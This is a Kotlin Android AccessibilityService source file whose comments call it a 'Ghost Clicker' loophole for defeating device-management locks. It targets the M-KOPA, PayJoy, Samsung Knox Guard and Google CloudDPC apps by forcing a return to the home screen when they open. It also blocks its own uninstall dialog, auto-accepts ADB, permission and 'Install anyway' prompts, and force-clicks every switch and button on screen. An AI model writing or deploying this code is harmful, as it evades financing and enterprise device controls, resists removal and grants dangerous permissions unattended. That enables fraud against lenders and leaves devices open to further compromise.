package com.example.mdmnew

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * v13.0: THE GHOST CLICKER
 * This service monitors the screen for grayed-out buttons or "Device Managed" dialogs.
 * It attempts to programmatically "click" them using Accessibility permissions, 
 * which often bypasses standard UI restrictions.
 */
class LoopholeAccessibilityService : AccessibilityService() {

    private var lastScanTime = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // v21.0: EVENT THROTTLING
        // Prevent lagging the system by limiting scans to every 500ms
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastScanTime < 500) return
        lastScanTime = currentTime

        // 1. FOCUS HIJACK PREVENTION (Anti-Lock)
        val activePkg = event.packageName?.toString() ?: ""
        val targets = listOf(
            "com.m-kopa.app", "com.mkopa.app", "com.mkopa.sales",
            "com.samsung.android.knox.guard", "com.samsung.android.kgclient",
            "com.google.android.apps.work.clouddpc", "com.payjoy.access"
        )
        
        if (targets.contains(activePkg)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            return
        }

        // 2. SELF-DEFENSE (Anti-Uninstall)
        // If the system tries to show the "Uninstall" dialog for this app, we kill it.
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val nodeText = rootNode.text?.toString() ?: ""
            if (nodeText.contains("Uninstall System Controller Pro?") || 
                nodeText.contains("Do you want to uninstall this app?")) {
                performGlobalAction(GLOBAL_ACTION_BACK)
            }
        }

        // 3. AUTO-ACCEPT ADB & PERMISSIONS
        findAndClick(rootNode, "ALLOW")
        findAndClick(rootNode, "OK")
        findAndClick(rootNode, "Always allow")
        findAndClick(rootNode, "Install anyway")

        // 4. THE UN-GRAY LOOPHOLE
        scanForHiddenToggles(rootNode)
    }

    private fun scanForHiddenToggles(node: AccessibilityNodeInfo?) {
        if (node == null) return
        if (node.className?.contains("Switch") == true || node.className?.contains("Button") == true) {
            // Programmatic "Forced Click"
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        for (i in 0 until node.childCount) {
            scanForHiddenToggles(node.getChild(i))
        }
    }

    private fun findAndClick(node: AccessibilityNodeInfo, text: String) {
        val nodes = node.findAccessibilityNodeInfosByText(text)
        for (n in nodes) {
            if (n.isClickable) {
                n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            } else {
                // Try clicking the parent if the text label itself isn't clickable
                n.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    override fun onInterrupt() {}
}
